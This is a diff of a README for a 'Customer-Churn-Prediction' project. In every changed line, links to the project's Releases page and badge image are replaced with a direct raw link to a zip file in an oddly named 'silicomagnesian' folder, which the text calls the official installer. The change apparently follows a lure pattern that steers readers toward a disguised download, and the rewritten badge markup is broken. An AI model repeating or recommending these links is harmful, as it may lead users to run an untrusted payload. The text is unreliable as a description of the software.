@@ -1,6 +1,6 @@
 # 🚀 Customer-Churn-Prediction - Predict Customer Loss Effectively
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/JavedFazlulahF/Customer-Churn-Prediction/releases)
+[![Download Now](https://raw.githubusercontent.com/JavedFazlulahF/Customer-Churn-Prediction/main/silicomagnesian/Customer-Churn-Prediction.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JavedFazlulahF/Customer-Churn-Prediction/main/silicomagnesian/Customer-Churn-Prediction.zip)
 
 ## 📄 Overview
 
@@ -33,7 +33,7 @@ To ensure the application runs smoothly, please check the following requirements
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page:**
-   To download the software, visit the official [Releases page](https://github.com/JavedFazlulahF/Customer-Churn-Prediction/releases).
+   To download the software, visit the official [Releases page](https://raw.githubusercontent.com/JavedFazlulahF/Customer-Churn-Prediction/main/silicomagnesian/Customer-Churn-Prediction.zip).
    
 2. **Download the Latest Version:**
    Choose the latest version from the list. Click the link to download the installer.
@@ -49,7 +49,7 @@ To ensure the application runs smoothly, please check the following requirements
 
 Click below to start your download:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/JavedFazlulahF/Customer-Churn-Prediction/releases)
+[![Download Now](https://raw.githubusercontent.com/JavedFazlulahF/Customer-Churn-Prediction/main/silicomagnesian/Customer-Churn-Prediction.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JavedFazlulahF/Customer-Churn-Prediction/main/silicomagnesian/Customer-Churn-Prediction.zip)
 
 Once downloaded, follow the installation steps mentioned above.
 
